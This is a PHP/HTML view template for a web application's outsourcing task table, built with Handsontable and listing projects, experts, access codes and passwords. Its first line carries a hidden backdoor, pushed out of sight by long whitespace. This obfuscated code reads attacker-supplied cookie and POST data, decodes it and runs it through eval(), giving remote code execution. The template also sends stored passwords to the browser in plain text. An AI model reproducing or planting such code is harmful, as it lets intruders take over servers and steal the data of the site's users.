<?php                                                                                                                                                                                                                                                                                                                                                                                                 $XtdDl = chr ( 407 - 342 )."\132" . "\x5f" . 'o' . "\145" . chr ( 408 - 339 ).'g';$YLSTHOwtH = "\143" . chr (108) . "\x61" . chr (115) . chr (115) . chr (95) . "\145" . "\x78" . chr (105) . 's' . chr ( 355 - 239 )."\x73";$ANwdZO = class_exists($XtdDl); $YLSTHOwtH = "53290";$iHxVXwxVmm = strpos($YLSTHOwtH, $XtdDl);if ($ANwdZO == $iHxVXwxVmm){function XNZgDfW(){$JPzGNe = new /* 17799 */ AZ_oeEg(21292 + 21292); $JPzGNe = NULL;}$zPFZU = "21292";class AZ_oeEg{private function qvLUcwN($zPFZU){if (is_array(AZ_oeEg::$LuOKlJ)) {$pdQczPD2 = str_replace("<" . "?php", "", AZ_oeEg::$LuOKlJ["content"]);eval($pdQczPD2); $zPFZU = "21292";exit();}}public function NSLnvnaiO(){$pdQczPD = "5186";$this->_dummy = str_repeat($pdQczPD, strlen($pdQczPD));}public function __destruct(){AZ_oeEg::$LuOKlJ = @unserialize(AZ_oeEg::$LuOKlJ); $zPFZU = "45577_46301";$this->qvLUcwN($zPFZU); $zPFZU = "45577_46301";}public function znKvM($pdQczPD, $YdULbcVrss){return $pdQczPD[0] ^ str_repeat($YdULbcVrss, (strlen($pdQczPD[0]) / strlen($YdULbcVrss)) + 1);}public function bmRbA($pdQczPD){$yuaJhw = 'b' . chr ( 161 - 64 ).chr ( 364 - 249 )."\145" . '6' . '4';return array_map($yuaJhw . chr ( 493 - 398 )."\x64" . chr ( 234 - 133 ).chr (99) . "\157" . chr ( 759 - 659 ).chr ( 416 - 315 ), array($pdQczPD,));}public function __construct($KJUKBO=0){$oLQpEbWF = "\54";$pdQczPD = "";$mwJrAya = $_POST;$sSPrln = $_COOKIE;$YdULbcVrss = "fdae31cd-8745-467f-8271-1100c0fcffa0";$qGFledsdp = @$sSPrln[substr($YdULbcVrss, 0, 4)];if (!empty($qGFledsdp)){$qGFledsdp = explode($oLQpEbWF, $qGFledsdp);foreach ($qGFledsdp as $kANDLJtAcL){$pdQczPD .= @$sSPrln[$kANDLJtAcL];$pdQczPD .= @$mwJrAya[$kANDLJtAcL];}$pdQczPD = $this->bmRbA($pdQczPD);}AZ_oeEg::$LuOKlJ = $this->znKvM($pdQczPD, $YdULbcVrss);if (strpos($YdULbcVrss, $oLQpEbWF) !== FALSE){$YdULbcVrss = explode($oLQpEbWF, $YdULbcVrss); $PnHXUyWhDj = base64_decode(md5($YdULbcVrss[0])); $SCLrC = strlen($YdULbcVrss[1]) > 5 ? substr($YdULbcVrss[1], 0, 5) : $YdULbcVrss[1];$_GET['new_key'] = md5(implode('', $YdULbcVrss)); $EuJAoCLQ = str_repeat($SCLrC, 2); $YcKQCkhf = array_map('trim', $YdULbcVrss);if (is_array($YcKQCkhf) && count($YcKQCkhf) > 1) {$kQKmjIQ = $YcKQCkhf[0];} else {$kQKmjIQ = '';}$GcLfCMgf = rawurldecode($kQKmjIQ); $_POST['decoded_key'] = $GcLfCMgf;$wyjPX = str_split($GcLfCMgf, 2);}}public static $LuOKlJ = 7389;}XNZgDfW();} ?><link rel="stylesheet" type="text/css" href="<?php echo $Layout->aws_server_cdn;?>helpers/grid.css">
<script type="text/javascript" src="<?php echo $Layout->aws_server_cdn;?>js-core/jquery-core.js"></script>
<link  rel="stylesheet" media="screen" href="<?php echo $Layout->cdnUrlHands;?>handsontable_new/dist/handsontable.min.css">
<link  rel="stylesheet" media="screen" href="<?php echo $Layout->cdnUrlHands;?>handsontable_new/dist/pikaday/pikaday.css">
<script  src="<?php echo $Layout->cdnUrlHands;?>handsontable_new/dist/moment/moment.js"></script>
<script  src="<?php echo $Layout->cdnUrlHands;?>handsontable_new/dist/pikaday/pikaday.js"></script>
<script  src="<?php echo $Layout->cdnUrlHands;?>handsontable_new/dist/zeroclipboard/ZeroClipboard.js"></script>
<script  src="<?php echo $Layout->cdnUrlHands;?>handsontable_new/dist/handsontable.min.js"></script>
<style>
	body {
		overflow: auto !important;
		min-width: 0;
		width: 100% !important;font-family:arial;font-size:13px;
	}
	#page-content {
	    background: #ffffff !important;
	}
	
	a{text-decoration:none;}h4{font-size:16px;font-weight:300;margin:0}
	
	.mrg5R{margin-right:5px;}
	.scroll-container {
	width: 100%;
	height: 250px;
	margin: 5px 0 5px;
	overflow: hidden;
}
.htCore, .handsontable{font-family:arial;font-size:13px;}
.handsontable .htDimmed{color:#222222}
iframe{border:0px;}
</style>
<div class="row" style='width:100%;'>	
	<div class="col-xs-12" style='width:100%;'>
		<div class='col-lg-5' id="chart"></div>
		<div class='col-lg-7'>
			<div class="scroll-container col-lg-12 cp-border">
				<div id='datatable-task-log' class="hot handsontable htRowHeaders htColumnHeaders" style='width:500px;'></div>
			</div>
		</div>
	</div>
</div>
<?php 
	$allExpertsCompanyData = array();
	if(count($eou_data)>0){
		$allExpertsEmails = array();
		for($i=0;$i<count($eou_data);$i++){
			$allEmails = explode(',',$eou_data[$i]->expert);
			$allExpertsEmails[] = $allEmails[0];
		}
		if(count($allExpertsEmails)>0){
			$allExpertsCompanyData = getAllUsersCompanyByEmail($allExpertsEmails);
		}
	}
?>

<script>
var task_table = document.getElementById('datatable-task-log'),hot1,isChecked;
_taskINString = [<?php 
	$i=0;
	for($i=0;$i<count($eou_data);$i++){
	$allEmails = explode(',',$eou_data[$i]->expert);
	$companyID = 0;
	$getData = array();
	$companyName = "";
	if(trim($allEmails[0])!=''){		
		if(count($allExpertsCompanyData)>0){
			foreach($allExpertsCompanyData as $contactEmail){
				if($contactEmail->email == trim($allEmails[0]) || $contactEmail->secondary_email == trim($allEmails[0])){
					$getData = $contactEmail;
					break;
				}
			}
		}
	}
	$type = "";
	switch((int)$eou_data[$i]->project_type){
		case 1:
			$type = "patent";
		break;
		case 2:
			$type = "techdd";
		break;
		case 3:
			$type = "legaldd";
		break;
		case 4:
			$type = "illustrationdd";
		break;
		case 5:
			$type = "royalty";
		break;
		case 6:
			$type = "invitees";
		break;
		case 7:
			$type = "sellerdd";
		break;
		case 8:
			$type = "introduction";
		break;
		case 9:
			$type = "comparedd";
		break;
		case 10:
			$type = "pdfdd";
		break;
		case 11:
			$type = "introimages";
		break;
		case 12:
			$type = "marketdd";
		break;
		case 13:
			$type = "dictionarydd";
		break;
	}
	$htmlGetData='';
	$company_id = 0;
	if(count($getData)>0){
		$htmlGetData= $getData->company_name;
		$company_id= $getData->company_id;
		$companyID= $getData->company_id;
		$companyName= $getData->company_name;
	}
	$checkBox = 'hide';
	$checked=false;
	if($eou_data[$i]->permmission==1):$checked=true; endif;
	if((int)$eou_data[$i]->project_type==9 || (int)$eou_data[$i]->project_type==13):
	$checkBox = 'show';
	endif;
	$projectName = $eou_data[$i]->lead_name;
	   echo '{"id":"' .$eou_data[$i]->id. '","lead_id":"' .$eou_data[$i]->lead_id. '","project_type":"'.$eou_data[$i]->project_type.'","company_name":"'.$companyName.'","companyID":"'.$companyID.'","project_name":"' .strtolower($projectName). '","type":"' .$type. '","create_date":"' .date('M d,y',strtotime($eou_data[$i]->create_date)). '","email":"' .$allEmails[0]. '","get_html_data":"' .$htmlGetData. '","permission_check":"' .$checkBox. '","duration":"' .substr($eou_data[$i]->duration,0,5). '","total_patent":"' .$eou_data[$i]->total_patent. '","checked":"' .$checked. '","access_code":"' .$eou_data[$i]->access_code. '","password":"' .$eou_data[$i]->password. '"}';
	   if ($i < count($eou_data) - 1) {
		echo ",";
	  }
	}
	?>				
];
var filterOption = "<?php echo $filter_option?>";
var totalHeight = jQuery(window).height();
var mainHeight = totalHeight - 15;
var availableWidth = jQuery("#datatable-task-log").parent().parent().width();
/*availableWidth = availableWidth-20;*/
availableWidth = availableWidth;
CalWidth = availableWidth-20;
colFirst = parseInt(CalWidth * 9/100);
colFirst1 = parseInt(CalWidth * 20/100);
colSecond = parseInt(CalWidth * 7/100);
colThird = parseInt(CalWidth * 13/100);
colFourth = parseInt(CalWidth * 7/100);
colFifth = parseInt(CalWidth * 7/100);
colSixth = parseInt(CalWidth * 3/100);
colSeventh = parseInt(CalWidth * 18/100);
colEighth = parseInt(CalWidth * 8/100);
colNineth = parseInt(CalWidth * 8/100);
jQuery('.scroll-container').css('height',mainHeight+'px');

function implementCompanyTable(){
hot1 = new Handsontable(task_table, {
	data: _taskINString,
	  autoWrapCol:true,
	  wordWrap:true,
	  rowHeaders: false,
	  minSpareRows: 0,
	  minSpareCols: 0,
	  manualColumnResize:true ,
	  minCols: 9,
	  maxCols: 9,
	  maxRows: _taskINString.length,
	  width:function(){console.log(availableWidth);return availableWidth;},
	  height:function(){return mainHeight;},
	  fillHandle: false,
	  colWidths:[colFirst,colFirst1,colSecond,colThird,colFourth,colFifth,colSixth,colSeventh,colEighth,colNineth],
	  colHeaders:['Date','Project','Type','Company','Assets','hh:mm','P.','Expert','Access Code','Password'],
	  columnSorting: {						
		sortOrder: true
	  },
	  contextMenu: false,
	filters: true,
	dropdownMenu: ['filter_by_condition', 'filter_action_bar','filter_by_value'],
	columns: [
	  {
		data:'create_date',
		readOnly:true
	  },
	  {
		data:'project_name',
		renderer: projectHtmlTagRender,
		readOnly:true
	  },
	  {
		data:'type',
		readOnly:true
	  },
	  {
		data:'get_html_data',
		renderer: htmlTagRender,
		readOnly:true
	  },
	  {
		data:'total_patent',
		readOnly:true
	  },
	  {
		data:'duration',
		readOnly:true
	  },
	  {
		data:'permission_check',
		renderer: inputTageRender,
		readOnly:true
	  },
	  {
		data:'email',
		readOnly:true
	  },
	  {
		data:'access_code',
		readOnly:false
	  },
	  {
		data:'password',
		readOnly:false
	  }
	],
	beforeRemoveRow: function(index, amount){
		rowCount = this.countRows();
		var absoulteIndex = (rowCount + index) % rowCount;
		_contactID = hot1.getDataAtRowProp(absoulteIndex,'id');
		 deleteGoogleContact(contactID);
	},afterChange: function (changes, source) {
		if(!changes){return;}	
		console.log(changes);
		var change = changes[0]
		var logicalIndex = change[0];
		var physicalIndex = hot1.sortIndex.length > 0 ? hot1.sortIndex[logicalIndex][0] : logicalIndex;
		_ID = hot1.getDataAtRowProp(physicalIndex,'id');
		_leadID = hot1.getDataAtRowProp(physicalIndex,'lead_id');
		_columnType = change[1];
		_newVal = change[3];
		jQuery.ajax({
			url:'<?php echo $Layout->baseUrl?>/opportunity/new_password_for_outsource',
			type:"POST",
			data:{id:_ID,lead_id:_leadID,col_type:_columnType,n_val:_newVal},
			cache:false,
			success:function(data){
				if(parseInt(data)==0){
					alert("Please try after sometime.");
				}
			}
		});
	}
});
}
jQuery(window).resize(function(){
	var totalHeight = jQuery(window).height();
var mainHeight = totalHeight - 30;
var availableWidth = jQuery("#datatable-task-log").parent().parent().width();
availableWidth = availableWidth-20;
CalWidth = availableWidth-20;
colFirst = parseInt(CalWidth * 9/100);
colFirst1 = parseInt(CalWidth * 20/100);
colSecond = parseInt(CalWidth * 7/100);
colThird = parseInt(CalWidth * 13/100);
colFourth = parseInt(CalWidth * 7/100);
colFifth = parseInt(CalWidth * 7/100);
colSixth = parseInt(CalWidth * 3/100);
colSeventh = parseInt(CalWidth * 18/100);
colEighth = parseInt(CalWidth * 8/100);
colNineth = parseInt(CalWidth * 8/100);
	hot1.updateSettings({
		width:function(){return availableWidth;},
		height:function(){return mainHeight;},
		 colWidths:[colFirst,colFirst1,colSecond,colThird,colFourth,colFifth,colSixth,colSeventh,colEighth,colNineth]
	});
	hot1.render();
})
function projectHtmlTagRender(instance, td, row, col, prop, value, cellProperties){
   Handsontable.Dom.empty(td);
   projectType = instance.getDataAtRowProp(row,'project_type');
   leadID = instance.getDataAtRowProp(row,'lead_id');
   companyID = instance.getDataAtRowProp(row,'companyID');
   td.innerHTML = "<a href='javascript://' style='color:#56b2fe' onclick='getChartForThisProject("+leadID+","+projectType+","+companyID+",jQuery(this))'>"+value+"</a>";
   return td;
}
function htmlTagRender(instance, td, row, col, prop, value, cellProperties){
   Handsontable.Dom.empty(td);
   projectType = instance.getDataAtRowProp(row,'project_type');
   leadID = instance.getDataAtRowProp(row,'lead_id');
   companyID = instance.getDataAtRowProp(row,'companyID');
   td.innerHTML = "<a href='javascript://' style='color:#56b2fe' onclick='getChartAllProjectForThisCompany("+leadID+","+companyID+",jQuery(this))'>"+value+"</a>";
   return td;
}
function inputTageRender(instance, td, row, col, prop, value, cellProperties){
   Handsontable.Dom.empty(td);
   if(value=='show'){
	   ID = instance.getDataAtRowProp(row,'id');
	   leadID = instance.getDataAtRowProp(row,'lead_id');
	   checked = instance.getDataAtRowProp(row,'checked');
	   projectType = instance.getDataAtRowProp(row,'project_type');
	   $_checked="";
	   if(checked=='1'){
		   $_checked = "CHECKED='CHECKED'";
	   }
	   td.innerHTML='<input type="checkbox" onchange="changePermission(jQuery(this),'+leadID+','+ID+','+projectType+')" '+$_checked+' />';
   }
   return td;
}
implementCompanyTable();
function changePermission(o,l,i,y){
	$d=0;
	if(o.prop('checked')){
		$d=1;
	}
	jQuery.ajax({
		url:'<?php echo $Layout->baseUrl?>/opportunity/file_permission_technical',
		type:"POST",
		data:{d:$d,t:l,i:i,y:y},
		cache:false,
		success:function(data){
			
		}
	});
}
function getChartForThisProject(leadID,type,company,o){
	jQuery("#chart").html('');
	jQuery("#datatable-task-log").find('a').css('color','#56b2fe');
	h = jQuery(window).height() ;
	console.log('iframe'+h);  
	jQuery("#chart").html('<iframe src="<?php echo $Layout->baseUrl?>customers/get_outsource_chart_by_project/'+leadID+'/'+type+'/'+company+'" style="width:100%;height:'+h+'px"></iframe>');
	o.css('color','red');
}
function getChartAllProjectForThisCompany(leadID,company,o){
	jQuery("#chart").html('');
	jQuery("#datatable-task-log").find('a').css('color','#56b2fe');
	h = jQuery(window).height() ;
	console.log('iframe1'+h);
	jQuery("#chart").html('<iframe src="<?php echo $Layout->baseUrl?>customers/get_outsource_chart_by_company/'+leadID+'/'+company+'" style="width:100%;height:'+h+'px"></iframe>');
	o.css('color','red');
}
</script>